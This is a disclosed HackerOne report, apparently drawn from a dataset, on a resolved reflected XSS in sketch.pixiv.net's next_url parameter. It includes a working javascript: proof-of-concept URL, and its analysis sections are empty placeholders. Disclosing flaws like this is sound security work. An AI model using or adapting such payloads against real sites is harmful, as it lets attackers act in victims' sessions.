---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1503601'
original_report_id: '1503601'
title: XSS Reflected at https://sketch.pixiv.net/ Via `next_url`
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: pixiv
created_at: '2022-03-08T04:12:52.192Z'
disclosed_at: '2022-03-23T01:19:37.774Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 58
asset_identifier: sketch.pixiv.net
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS Reflected at https://sketch.pixiv.net/ Via `next_url`

## Metadata

- HackerOne Report ID: 1503601
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: pixiv
- Disclosed At: 2022-03-23T01:19:37.774Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I Found XSS Reflected at https://sketch.pixiv.net/ Via Success URL

##Follow Me :)

##Steps :
1. Open the URL below:
https://sketch.pixiv.net/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain)

2. Pop ups appear :)

## Impact

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can: Perform any action within the application that the user can perform

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
